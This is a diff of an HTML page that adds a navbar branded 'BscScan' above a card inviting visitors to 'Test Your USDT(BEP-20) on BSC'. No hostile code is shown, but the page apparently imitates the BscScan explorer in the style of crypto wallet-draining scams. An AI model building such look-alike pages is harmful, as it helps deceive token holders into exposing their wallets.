@@ -10,10 +10,37 @@
             background-color: #121212;
             color: #fff;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            flex-direction: column; /* Arrange navbar above content */
+            align-items: center; /* Center content horizontally */
+            min-height: 100vh;
             margin: 0;
+        }
+        .navbar {
+            background-color: #1e1e1e; /* Dark background for navbar */
+            color: #fff;
+            padding: 1em 2em;
+            width: 100%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .navbar-logo {
+            font-weight: bold;
+            font-size: 1.2em;
+            color: #00cc99; /* A highlight color */
+        }
+        .navbar-menu {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            gap: 1em;
+        }
+        .navbar-menu a {
+            color: #eee;
+            text-decoration: none;
+            font-size: 0.9em;
         }
         .card {
             background: #1e1e1e;
@@ -22,6 +49,7 @@
             text-align: center;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
             max-width: 400px;
+            margin-top: 2em; /* Add some space below the navbar */
         }
         button {
             background-color: #00cc99;
@@ -45,6 +73,16 @@
     </style>
 </head>
 <body>
+    <nav class="navbar">
+        <div class="navbar-logo">BscScan</div>
+        <ul class="navbar-menu">
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Blockchain</a></li>
+            <li><a href="#">Tokens</a></li>
+            <li><a href="#">More</a></li>
+        </ul>
+    </nav>
+
     <div class="card">
         <h2>USDT (BEP-20)</h2>
         <p>This will Test Your USDT(BEP-20) on BSC:</p>
